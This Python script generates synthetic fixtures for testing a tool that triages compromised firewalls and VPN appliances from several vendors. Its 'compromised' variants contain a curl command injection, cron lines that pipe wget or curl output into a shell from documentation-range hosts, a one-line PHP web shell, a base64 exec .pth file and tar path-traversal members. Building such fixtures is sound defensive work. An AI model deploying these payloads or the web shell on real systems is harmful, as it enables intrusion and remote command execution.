#!/usr/bin/env python3
"""Build synthetic replay fixtures for the test suite.

Every value here is invented. Addresses come from the documentation ranges
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), hostnames and users are
placeholders, and the "malicious" content is the minimum needed to exercise a
detection - no working exploit or implant code.

Fixtures are generated rather than committed because several of them depend
on exact bytes (non-printable memory-leak bytes, tar members with traversal
paths and symlinks) that do not survive editors and git attributes reliably.

Usage:  python tests/make_fixtures.py <out_dir>
"""
from __future__ import annotations

import io
import json
import sys
import tarfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from edgetriage.util import slugify  # noqa: E402

GUID = "3f2b8c1e-9d4a-4b7e-a1c2-5e6f7a8b9c0d"


def write_cmds(root: Path, outputs: dict[str, str | bytes]) -> None:
    for cmd, text in outputs.items():
        p = root / "commands" / f"{slugify(cmd)}.txt"
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(text if isinstance(text, bytes) else text.encode())


def write_files(root: Path, files: dict[str, str | bytes]) -> None:
    for remote, data in files.items():
        p = root / "files" / remote.lstrip("/")
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data if isinstance(data, bytes) else data.encode())


# ----------------------------------------------------------------- PAN-OS
PANOS_COMMON = {
    "show clock": "Thu Oct 22 14:02:11 UTC 2026\n",
    "show system info": "hostname: fw-lab-01\nip-address: 192.0.2.10\nmodel: PA-VM\nsw-version: 10.2.9\nuptime: 41 days, 3:10:22\n",
    "show system resources": "top - 14:02:12 up 41 days\n  PID USER  %CPU COMMAND\n 1021 root   1.0 mgmtsrvr\n",
    "show admins all": "Admin    From          Client Session-start\nadmin    192.0.2.50    CLI    10/22 13:58:01\n",
    "show jobs all": "Enqueued  Dequeued  ID  Type  Status Result\n2026/10/01 09:00:00 2026/10/01 09:00:01 101 Commit FIN OK\n",
    "show config running": "<config version=\"10.2.0\"><devices/></config>\n",
    "show log config direction equal backward": "2026/10/20 10:00:00 admin config set deviceconfig system\n",
    "show log auth direction equal backward": "2026/10/20 09:59:00 auth success user=admin from=192.0.2.50\n",
}


def panos(root: Path, malicious: bool) -> None:
    gp = [f'{{"time":"2026-10-14T06:51:00.120-07:00","message":"session {GUID} established"}}']
    syslog = ["2026/10/14 06:40:00 system general  GlobalProtect portal started"]
    if malicious:
        gp += [
            '{"time":"2026-10-14T06:53:09.123-07:00","message":"failed to unmarshal session(./../../../opt/panlogs/tmp/device_telemetry/minute/x) map , EOF"}',
            '{"time":"2026-10-14T06:53:41.456-07:00","message":"failed to unmarshal session(./../../../opt/panlogs/tmp/device_telemetry/minute/y`curl${IFS}198.51.100.7:4444`) map , EOF"}',
        ]
        syslog += ["2026/10/14 07:00:01 crond[4411]: (root) CMD (wget -qO- http://203.0.113.9/policy | bash)"]
    else:
        gp += [f'{{"time":"2026-10-14T07:10:00.000-07:00","message":"failed to unmarshal session({GUID}) map , EOF"}}']
    out = dict(PANOS_COMMON)
    out["tail lines 10000 mp-log gpsvc.log"] = "\n".join(gp) + "\n"
    out["show log system direction equal backward"] = "\n".join(syslog) + "\n"
    out["tail lines 10000 mp-log sslvpn_ngx_error.log"] = "2026/10/14 06:52:00 [error] 2211#0: open() failed (2: No such file)\n"
    write_cmds(root, out)


def panos_tsf(path: Path) -> None:
    """A TSF-shaped tarball with UPSTYLE-shaped artefacts and hostile members."""
    blob = "QUJD" * 80
    members = {
        "opt/pancfg/mgmt/python3/site-packages/system.pth":
            f"import os, base64\nexec(base64.b64decode('{blob}'))\n",
        "var/appweb/sslvpndocs/global-protect/portal/js/jquery.min.js":
            '<config version="10.2.0"><mgt-config><users/></mgt-config></config>\n',
        "var/log/pan/gpsvc.log":
            f'{{"time":"2026-10-14T06:51:00.000-07:00","message":"session {GUID} established"}}\n',
    }
    with tarfile.open(path, "w:gz") as tf:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            raw = data.encode()
            info.size = len(raw)
            tf.addfile(info, io.BytesIO(raw))
        evil = tarfile.TarInfo("../../escape.txt")
        evil.size = 4
        tf.addfile(evil, io.BytesIO(b"nope"))
        link = tarfile.TarInfo("var/lang/custom/x")
        link.type = tarfile.SYMTYPE
        link.linkname = "/"
        tf.addfile(link)


# ----------------------------------------------------------------- NetScaler
SHELL_PHP = b"<?php if(isset($_REQUEST['c'])){ system($_REQUEST['c']); } ?>\n"
BENIGN_PHP = b"<?php\n/* logon helper */\nheader('Location: /vpn/index.html');\n?>\n"


def netscaler(root: Path, malicious: bool) -> None:
    base = "/var/netscaler/logon/LogonPoint"
    php = {f"{base}/index.php": BENIGN_PHP}
    ls = [f"  81234  8 -r--r--r--  1 nobody  wheel  {len(BENIGN_PHP)} Jun 11  2026 {base}/index.php"]
    if malicious:
        php[f"{base}/uiareas/a1b2.php"] = SHELL_PHP
        ls.append(f"  81300  8 -rw-r--r--  1 nobody  wheel  {len(SHELL_PHP)} Oct 14 07:12 {base}/uiareas/a1b2.php")
    listing = "\n".join(php) + "\n"
    out = {
        "shell date -u": "Thu Oct 22 14:02:11 UTC 2026\n",
        "show ns version": "NetScaler NS14.1: Build 43.50.nc\n Done\n",
        "shell uptime": " 2:02PM  up 40 days,  1:01, 1 user\n",
        "shell ps auxww": "USER PID %CPU COMMAND\nroot 1 0.0 /sbin/init\n",
        "shell netstat -an": "Proto Recv-Q Send-Q Local Address Foreign Address (state)\n",
        "shell sockstat -46": "USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS\nroot     nsppe      812   10 tcp4   *:443                 *:*\n"
                              + ("nobody   sh         4410  3  tcp4   192.0.2.20:51234      203.0.113.9:4444\n" if malicious else ""),
        "show ns runningConfig": "set ns config -IPAddress 192.0.2.20\n",
        "shell find /var/netscaler/logon /var/vpn /netscaler/ns_gui /var/netscaler/ns_gui -type f -name '*.php' -ls": "\n".join(ls) + "\n",
        "shell find /var/netscaler/logon /var/vpn /netscaler/ns_gui /var/netscaler/ns_gui -type f -name '*.php'": listing,
        "shell find /var /tmp /flash -xdev -type f -perm -4000": "/var/tmp/.x/su2\n" if malicious else "",
        "shell crontab -l": "*/5 * * * * curl -s http://203.0.113.9/u | sh\n" if malicious else "# no entries\n",
        "shell cat /etc/crontab": "SHELL=/bin/sh\n0 * * * * root newsyslog\n",
        "shell ls -la /tmp /var/tmp": "total 0\n",
        "shell find /var/log -maxdepth 1 -type f -name 'ns.log*'": "/var/log/ns.log\n",
        "shell find /var/log -maxdepth 1 -type f -name 'http*.log*'": "/var/log/httpaccess.log\n",
    }
    write_cmds(root, out)
    nslog = [b'Oct 14 06:00:00 <local0.info> 192.0.2.20 10/14/2026:06:00:00 GMT ns-gw 0-PPE-0 : default AAA LOGIN_FAILED 101 0 :  User jdoe-lab - Client_ip 198.51.100.20 - Failure_reason "Invalid credentials"']
    if malicious:
        nslog.append(b'Oct 14 06:05:01 <local0.info> 192.0.2.20 10/14/2026:06:05:01 GMT ns-gw 0-PPE-0 : default AAA LOGIN_FAILED 102 0 :  User \x00\x07\xc3\x1fX\x02 - Client_ip 198.51.100.66 - Failure_reason ""')
    files = dict(php)
    files["/var/log/ns.log"] = b"\n".join(nslog) + b"\n"
    files["/var/log/httpaccess.log"] = b'198.51.100.20 - - [14/Oct/2026:06:00:00 +0000] "GET /vpn/index.html HTTP/1.1" 200 512\n'
    write_files(root, files)


# ----------------------------------------------------------------- Cisco ASA
def asa(root: Path, malicious: bool) -> None:
    # Real `show memory region` is /proc/maps-style: start-end joined by a hyphen,
    # perms, offset, dev, inode, pathname. No 0x prefix, no length column.
    # Format pinned from Cisco's command reference and the Talos ArcaneDoor example.
    regions = [
        "Address                   Perm Offset   Dev   Inode   Pathname",
        "561d9fee9000-561da3b60000 r-xp 00000000 00:02 5955    /asa/bin/lina",
        "561da3b60000-561da4180000 rw-p 03c77000 00:02 5955    /asa/bin/lina",
    ]
    if malicious:
        # One extra executable lina region, exactly 0x1000 bytes long.
        regions.append("7f1c2a3b4000-7f1c2a3b5000 r-xp 00000000 00:02 5955    /asa/bin/lina")
    lina = "\n".join(r for r in regions if "lina" in r) + "\n"
    disk0 = ["Directory of disk0:/", "  11  -rwx  112640512  10:00:00 Jan 05 2026  asa9-20-3-smp-k8.bin"]
    if malicious:
        disk0.append("  57  -rwx  20480  07:30:12 Oct 14 2026  client_bundle_install.zip")
    out = {
        "show clock": "14:02:11.123 UTC Thu Oct 22 2026\n",
        "show version": "Cisco Adaptive Security Appliance Software Version 9.20(3)\nfw-asa-lab up 12 days 4 hours\n",
        "show memory region | include lina": lina,
        "show memory region": "\n".join(regions) + "\n",
        "show checkheaps": "Checkheaps stats from buffer validation runs\n",
        "show processes": "PC SP STATE Runtime SBASE Stack Process\n",
        "show conn count": "42 in use, 1200 most used\n",
        "show ssh sessions": "SID Client IP Version Mode Encryption\n",
        "show vpn-sessiondb summary": "Total Active : 3\n",
        "show vpn-sessiondb anyconnect": "Username : jdoe-lab  Assigned IP : 10.20.0.15  Public IP : 198.51.100.20\n",
        "show running-config": "hostname fw-asa-lab\nlogging enable\n",
        "show logging": ("Syslog logging: disabled\n" if malicious else "Syslog logging: enabled\n") + "    Facility: 20\n",
        "show crashinfo": "No crash information available\n",
        "dir /recursive disk0:": "\n".join(disk0) + "\n",
    }
    write_cmds(root, out)


# ----------------------------------------------------------------- FortiOS
FORTI_HASHES = {
    "/bin/sslvpnd": "a" * 64,
    "/bin/init": "b" * 64,
    "/lib/libips.so": "c" * 64,
}


def fortios(root: Path, malicious: bool) -> None:
    hashes = dict(FORTI_HASHES)
    if malicious:
        hashes["/bin/sslvpnd"] = "d" * 64
    lang = ["drwxr-xr-x    2 0  0   0 Mar  1 10:00 .", "-rw-r--r--    1 0  0  96 Mar  1 10:00 en.json"]
    if malicious:
        lang.append("lrwxrwxrwx    1 0  0   1 Apr  2 03:11 x -> /")
    out = {
        "get system status": "Version: FortiGate-VM64 v7.4.4,build2662,240514 (GA.F)\nHostname: fgt-lab-01\nSystem time: Thu Oct 22 14:02:11 2026\n",
        "diagnose sys top 1 50 1": "Run Time:  40 days, 2 hours\n sslvpnd  211  S  0.0  1.2\n",
        "get system performance status": "CPU states: 1% user\nUptime: 40 days\n",
        "diagnose sys session stat": "session_count=120\n",
        "get system admin list": "username  login-type  from\nadmin     ssh         192.0.2.50\n",
        "get vpn ssl monitor": "SSL-VPN Login Users:\n Index  User  Group  Auth Type  Timeout  From  HTTP in/out  HTTPS in/out\n",
        "diagnose sys filesystem hash": "\n".join(f"{h}  {p}" for p, h in hashes.items()) + "\n",
        "show": "config system global\n    set hostname \"fgt-lab-01\"\nend\n",
        "diagnose debug crashlog read": ("2026-10-13 22:01:02 <00211> application sslvpnd\n2026-10-13 22:01:02 <00211> *** signal 11 (Segmentation fault) received ***\n2026-10-13 22:01:02 sslvpnd pid=211 signal 11 received\n"
                                         if malicious else "Crash log interval is 3600 seconds\n"),
        "fnsysctl ls -la /data/lang/custom": "\n".join(lang) + "\n",
        "fnsysctl ls -la /data": "drwxr-xr-x 2 0 0 0 Mar 1 10:00 lang\n",
    }
    write_cmds(root, out)


# ----------------------------------------------------------------- Juniper Junos
def junos(root: Path, malicious: bool) -> None:
    procs = [
        "last pid:  4411;  load averages:  0.10,  0.12,  0.11  up 41+03:10:22",
        "  PID USERNAME  THR PRI NICE   SIZE    RES STATE    TIME    WCPU COMMAND",
        " 1520 root        1  20    0   712M   102M select   9:21   0.00% rpd",
        " 1544 root        1  20    0    92M    18M select   0:11   0.00% appidd",
        " 1571 root        1  20    0    40M     9M select   0:02   0.00% jddosd",
    ]
    if malicious:
        procs += [" 3301 root        1  20    0    12M     3M select   0:00   0.00% appid",
                  " 3302 root        1  20    0     9M     2M select   0:00   0.00% to"]
    var_log = ["/var/log/:", "-rw-r-----  1 root  wheel   88213 Oct 22 14:01 messages",
               "-rw-rw-r--  1 root  wheel   12001 Oct 22 14:01 interactive-commands",
               "-rw-r--r--  1 root  wheel    4410 Oct 22 13:58 wtmp"]
    if malicious:
        var_log += ["-rw-r--r--  1 root  wheel    4410 Oct 14 07:10 wtmp0",
                    "-rw-r--r--  1 root  wheel    2048 Oct 14 07:10 utx.log0"]
    var_tmp = ["/var/tmp/:", "-rw-r--r--  1 root  wheel     512 Oct 01 09:00 rtsdb.tmp"]
    if malicious:
        var_tmp += ["-rw-r--r--  1 root  wheel   81232 Oct 14 07:02 ldb.b64",
                    "-rw-r--r--  1 root  wheel   40960 Oct 14 07:02 loader.bin",
                    "prw-r--r--  1 root  wheel       0 Oct 14 07:03 null"]
    out = {
        "show version | no-more": "Hostname: mx-lab-01\nModel: mx204\nJunos: 21.2R3-S2.9\n",
        "show system uptime | no-more": "Current time: 2026-10-22 14:02:11 UTC\nSystem booted: 2026-09-10 10:51:49 UTC (6w0d 03:10 ago)\n",
        "show system processes extensive | no-more": "\n".join(procs) + "\n",
        "show system users | no-more": "USER     TTY      FROM                              LOGIN@  IDLE WHAT\nir-ro    pts/0    192.0.2.50                         2:01PM     - -cli (cli)\n",
        "request system malware-scan integrity-check": "Integrity check: PASSED\n",
        "show configuration | display set | no-more": "set system host-name mx-lab-01\nset system syslog host 192.0.2.60 any any\n",
        "show system commit | no-more": "0   2026-10-01 09:00:00 UTC by netadmin via cli\n",
        "show log messages | no-more": "Oct 22 13:58:01  mx-lab-01 mgd[2210]: UI_LOGIN_EVENT: User 'ir-ro' login, class 'j-read-only' [2210]\n",
        "show log interactive-commands | no-more": "Oct 22 13:58:05  mx-lab-01 mgd[2210]: UI_CMDLINE_READ_LINE: User 'ir-ro', command 'show version '\n",
        "file list /var/log detail | no-more": "\n".join(var_log) + "\n",
        "file list /var/tmp detail | no-more": "\n".join(var_tmp) + "\n",
        "file list /config detail | no-more": "/config/:\n-rw-r-----  1 root  wheel  9921 Oct 01 09:00 juniper.conf.gz\n",
        "file list /var/db/config detail | no-more": "/var/db/config/:\n-rw-r-----  1 root  wheel  9810 Sep 20 09:00 juniper.conf.4.gz\n",
        "file list /var/db/scripts detail recursive | no-more": "/var/db/scripts/:\ntotal 0\n",
    }
    write_cmds(root, out)


# ----------------------------------------------------------------- Cisco IOS XE
def _smaps(rows: list[tuple[str, str, int]]) -> str:
    out = []
    for rng, perms, dirty in rows:
        out += [f"{rng} {perms} 00000000 00:00 0 /tmp/sw/mount/rp_base/usr/binos/bin/linux_iosd-imag",
                "Size:               6144 kB", "Rss:                5120 kB",
                "Private_Clean:      5120 kB", f"Private_Dirty:        {dirty} kB"]
    return "\n".join(out) + "\n"


def iosxe(root: Path, malicious: bool) -> None:
    rows = [("55d6c4a00000-55d6c5000000", "r-xp", 0), ("55d6c5000000-55d6c5400000", "rw-p", 812),
            ("55d6c5400000-55d6c5600000", "rwxp", 12 if malicious else 0)]
    logs = ["*Oct 22 13:58:01.123: %SEC_LOGIN-5-LOGIN_SUCCESS: Login Success [user: netadmin] [Source: 192.0.2.50]"]
    if malicious:
        logs += ["*Oct 14 06:51:02.441: %SYS-5-CONFIG_P: Configured programmatically by process SEP_webui_wsma_http from console as user on line",
                 "*Oct 14 06:51:40.002: %WEBUI-6-INSTALL_OPERATION_INFO: User: cisco_support, Install Operation: ADD bootflash:x.lua"]
    users = "username netadmin privilege 15 secret 9 REDACTED\n"
    if malicious:
        users += "username cisco_support privilege 15 secret 9 REDACTED\n"
    dirl = ["Directory of bootflash:/", "   11  -rw-  612311040  Jan 05 2026 10:00:00 +00:00  packages.conf",
            "Directory of harddisk:/tracelogs/", "   40  -rw-      22011  Oct 22 2026 13:00:00 +00:00  iosrp_R0-0.1234.log"]
    if malicious:
        dirl.insert(2, "   57  -rw-     481233  Oct 14 2026 07:30:12 +00:00  tac.pcap")
        dirl.append("   41  -rw-       3302  Oct 14 2026 07:12:00 +00:00  system_shell_R0-0.4411.log")
    out = {
        "show clock": "*14:02:11.123 UTC Thu Oct 22 2026\n",
        "show version": "Cisco IOS XE Software, Version 17.09.04a\nrtr-lab-01 uptime is 6 weeks, 0 days, 3 hours\nSystem image file is \"bootflash:packages.conf\"\n",
        "show platform software process memory rp active name iosd smaps": _smaps(rows),
        "show users": "    Line       User       Host(s)              Idle       Location\n*  2 vty 0     netadmin   idle                 00:00:00 192.0.2.50\n",
        "show iox": "IOx Infrastructure Summary:\nIOx service (CAF)  : Not Running\n",
        "show app-hosting list": "No App found\n",
        "show platform integrity sign nonce 12345": "Platform: C8300\nBoot 0 Version: F01001R06.0123\nSignature version: 1\n",
        "show software authenticity running": "SYSTEM IMAGE\n------------\nImage type    : Production\n  Common Name : CiscoSystems\n",
        "show platform hardware authentication status": "SUDI Authentication: pass\n",
        "show running-config": "hostname rtr-lab-01\n" + users + "no ip http server\n",
        "show running-config | include ip http server|secure|active": "no ip http server\nno ip http secure-server\n",
        "show logging": "Syslog logging: enabled\n" + "\n".join(logs) + "\n",
        "dir /recursive all-filesystems": "\n".join(dirl) + "\n",
        "verify /sha512 bootflash:packages.conf": "verify /sha512 (bootflash:packages.conf) = " + "ab" * 64 + "\n",
    }
    write_cmds(root, out)


# ----------------------------------------------------------------- F5 BIG-IP
def f5(root: Path, malicious: bool) -> None:
    def ls_ioc():
        if malicious:
            return ("prw-------. 1 root root 0 Oct 14 07:02 /run/bigtlog.pipe\n"
                    "-rw-r--r--. 1 root root 812 Oct 14 07:02 /run/bigstart.ltm\n")
        return ("ls: cannot access '/run/bigtlog.pipe': No such file or directory\n"
                "ls: cannot access '/run/bigstart.ltm': No such file or directory\n")
    out = {
        "date -u": "Thu Oct 22 14:02:11 UTC 2026\n",
        "tmsh show sys version | cat": "Sys::Version\nMain Package\n  Product     BIG-IP\n  Version     17.1.3\n",
        "uptime": " 14:02:11 up 41 days,  3:10,  1 user,  load average: 0.10, 0.12, 0.11\n",
        "ps auxww": "USER PID %CPU COMMAND\nroot 1 0.0 /usr/lib/systemd/systemd\n",
        "lsof -n": "COMMAND PID USER FD TYPE NAME\nhttpd 2210 apache 4u REG /var/log/httpd/access_log\n"
                   + ("apmd64 3301 root 9w FIFO /run/bigtlog.pipe\n" if malicious else ""),
        "netstat -anp": "Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name\n",
        "tmsh list apm session | cat": "",
        "tmctl global_oauth_stat -s total_requests,total_userinfo_requests,total_failed": "total_requests total_userinfo_requests total_failed\n120 40 3\n",
        "getenforce": "Permissive\n" if malicious else "Enforcing\n",
        "semanage permissive -l": ("\nBuiltin Permissive Types\n\nCustomized Permissive Types\n\nhttpd_t\n" if malicious
                                   else "\nBuiltin Permissive Types\n\nCustomized Permissive Types\n\n"),
        "ls -la /run/bigtlog.pipe /run/bigstart.ltm": ls_ioc(),
        "mount": ("/dev/mapper/vg-db--vda-set.1._usr on /usr type ext4 (rw,relatime)\n" if malicious
                  else "/dev/mapper/vg-db--vda-set.1._usr on /usr type ext4 (ro,relatime)\n"),
        "tmsh list auth user | cat": "auth user admin {\n    role admin\n}\n",
        "tmsh list sys management-ip | cat": "sys management-ip 192.0.2.30/24 { }\n",
        "tmsh list ltm rule | cat": "",
        "ls -lt /etc/cron* /var/spool/cron": "/etc/cron.daily:\ntotal 0\n",
        "find /usr/local/www -type f -name '.*'": "",
        "cat /config/startup": "#!/bin/sh\n# Default startup script\n",
        "cat /etc/rc.d/rc.local": "#!/bin/sh\ntouch /var/lock/subsys/local\n",
        "ls -1d /var/log/audit*": "/var/log/audit\n",
        "ls -1d /var/log/restjavad-audit*": "/var/log/restjavad-audit.0.log\n",
        "ls -1d /var/log/apm*": "/var/log/apm\n",
        "ls -1d /var/log/auditd/audit.log*": "/var/log/auditd/audit.log\n",
        "ls -1d /var/log/tomcat/catalina.out*": "/var/log/tomcat/catalina.out\n",
        "ls -1d /var/log/secure*": "/var/log/secure\n",
        "ls -1d /var/log/ltm*": "/var/log/ltm\n",
    }
    write_cmds(root, out)
    fail = ("Oct 14 06:{m:02d}:00 bigip-lab err tmm1[30975]: 01990004:3: /Common/oauth_as: Request UserInfo from Source ID "
            "(null) IP {ip} failed. Error Code (invalid_token) Error Description (The access token is invalid.)")
    apm = [fail.format(m=i, ip="198.51.100.20") for i in range(3)]
    if malicious:
        apm += [fail.format(m=10 + i, ip="203.0.113.77") for i in range(12)]
    audit = ["Oct 22 13:58:01 bigip-lab notice icrd_child[2210]: AUDIT - user admin - RAW: tmsh show sys version"]
    rest = ['[I][1][22 Oct 2026 13:58:01 UTC][ForwarderPassThroughWorker] {"user":"local/admin","method":"GET","uri":"http://localhost:8100/mgmt/tm/sys/version","status":200,"from":"192.0.2.50"}']
    auditd = ["type=USER_LOGIN msg=audit(1729605481.123:401): pid=2210 uid=0 res=success"]
    if malicious:
        audit.append("Oct 14 07:01:02 bigip-lab notice tmsh[4410]: AUDIT - user=f5hubblelcdadmin folder=/Common module=(tmos)# status=[Command OK] cmd_data=run util bash")
        rest.append('[I][1][14 Oct 2026 07:01:00 UTC][ForwarderPassThroughWorker] {"user":"local/f5hubblelcdadmin","method":"POST","uri":"http://localhost:8100/mgmt/tm/util/bash","status":200,"from":"Unknown"}')
        auditd.append("type=MAC_STATUS msg=audit(1728889262.002:9921): avc: received setenforce notice (enforcing=0)")
    write_files(root, {
        "/var/log/apm": "\n".join(apm) + "\n",
        "/var/log/audit": "\n".join(audit) + "\n",
        "/var/log/restjavad-audit.0.log": "\n".join(rest) + "\n",
        "/var/log/auditd/audit.log": "\n".join(auditd) + "\n",
        "/var/log/tomcat/catalina.out": "INFO: Server startup in 4120 ms\n",
        "/var/log/secure": "Oct 22 13:58:01 bigip-lab sshd[2210]: Accepted publickey for admin from 192.0.2.50\n",
        "/var/log/ltm": "Oct 22 13:00:00 bigip-lab info tmm[11]: 01010028:5: No members available for pool /Common/web\n",
    })


# ----------------------------------------------------------------- Check Point Gaia
CPM = "/opt/CPsuite-R82/fw1/log/cpm.elg"
VPND = "/opt/CPsuite-R82/fw1/log/vpnd.elg"


def checkpoint(root: Path, malicious: bool) -> None:
    dumps = "total 0\n"
    if malicious:
        dumps = "total 81232\n-rw-r--r-- 1 admin root 83177472 Oct 14 06:52 core.fwm.4410.gz\n"
    out = {
        "date -u": "Thu Oct 22 14:02:11 UTC 2026\n",
        "uptime": " 14:02:11 up 41 days,  3:10,  1 user,  load average: 0.10, 0.12, 0.11\n",
        "fw ver": "This is Check Point's software version R82 - Build 001\n",
        "fwm ver": "This is Check Point Security Management Server R82 - Build 001\n",
        "cpinfo -y all": "[CPFC]\n    HOTFIX_R82_JUMBO_HF_MAIN    Take:  130\n",
        "cplp list": "LivePatch: no packages installed\n",
        "ps auxww": "USER PID %CPU COMMAND\nadmin 1 0.0 init\n",
        "netstat -anp": "Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name\n",
        "listusers": "",
        "ls -l /var/log/dump/usermode/": dumps,
        "crontab -l": "no crontab for admin\n",
        "ls -1d $MDS_FWDIR/log/cpm.elg*": CPM + "\n",
        "ls -1d $FWDIR/log/vpnd.elg*": VPND + "\n",
        "ls -1d /var/log/messages*": "/var/log/messages\n",
        "ls -1d /var/log/command_logger.log*": "ls: cannot access /var/log/command_logger.log*: No such file or directory\n",
    }
    write_cmds(root, out)
    cpm = ["2026-10-22 13:58:01,120 INFO  login(loginRequest=LoginRequest{authenticationInfo=AuthenticationInfoBase{username='netadmin', ...}"]
    vpnd = ["[vpnd 2210]@gw-lab[22 Oct 13:58:01] ike: SA established"]
    if malicious:
        cpm += ["2026-10-14 06:52:00,001 INFO  login(loginRequest=LoginRequest{authenticationInfo=AuthenticationInfoBase{username='"
                + "A" * 1100 + "', ...}",
                "2026-10-14 06:53:10,442 INFO  Uploading file ../../../CPupgrade-tools-R82/scripts/check_upgrade_tools.sh"]
        vpnd += ["[vpnd 2210]@gw-lab[14 Oct 06:50:01] Suspected path traversal attack from 203.0.113.9"]
    write_files(root, {CPM: "\n".join(cpm) + "\n", VPND: "\n".join(vpnd) + "\n",
                       "/var/log/messages": "Oct 22 13:58:01 gw-lab clish[2210]: User admin logged in\n"})


def main(out: Path) -> None:
    out.mkdir(parents=True, exist_ok=True)
    panos(out / "panos-compromised", True)
    panos(out / "panos-benign", False)
    panos_tsf(out / "panos-tsf.tgz")
    netscaler(out / "netscaler-compromised", True)
    netscaler(out / "netscaler-benign", False)
    asa(out / "asa-compromised", True)
    asa(out / "asa-benign", False)
    fortios(out / "fortios-compromised", True)
    (out / "fortios-baseline.json").write_text(json.dumps(FORTI_HASHES, indent=2))
    junos(out / "junos-compromised", True)
    junos(out / "junos-benign", False)
    iosxe(out / "iosxe-compromised", True)
    iosxe(out / "iosxe-benign", False)
    f5(out / "f5-compromised", True)
    f5(out / "f5-benign", False)
    checkpoint(out / "checkpoint-compromised", True)
    checkpoint(out / "checkpoint-benign", False)
    (out / "iosxe-implant-check.txt").write_text("6d2f1c4e8a9b0f73\n")
    (out / "cp-85102-export.csv").write_text(
        "time,product,action,src,user_dn\n2026-09-13 02:11:00,Mobile Access,Log In,203.0.113.88,\"CN=vpn-user,OU=users,O=global\"\n")
    (out / "shell.php").write_bytes(SHELL_PHP)
    (out / "benign.php").write_bytes(BENIGN_PHP)


if __name__ == "__main__":
    main(Path(sys.argv[1] if len(sys.argv) > 1 else "tests/fixtures/generated"))
